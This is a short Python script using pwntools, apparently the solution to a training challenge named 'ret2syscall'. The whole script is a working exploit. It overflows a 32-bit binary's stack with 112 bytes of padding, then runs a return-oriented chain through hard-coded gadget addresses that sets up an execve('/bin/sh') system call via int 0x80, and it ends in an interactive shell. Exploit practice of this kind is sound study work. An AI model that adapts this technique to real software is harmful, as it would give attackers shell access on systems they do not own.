from pwn import *

io = process('./ret2syscall')

eax_ret_address = 0x080bb196

ebx_ecx_edx_ret_address = 0x0806eb90

bin_sh_address = 0x080be408

int_0x80_address = 0x08049421

payload = b'A'*112 + p32(eax_ret_address) + p32(0xb) + p32(ebx_ecx_edx_ret_address) + p32(0) + p32(0) + p32(bin_sh_address) + p32(int_0x80_address)

io.sendline(payload)

io.interactive()

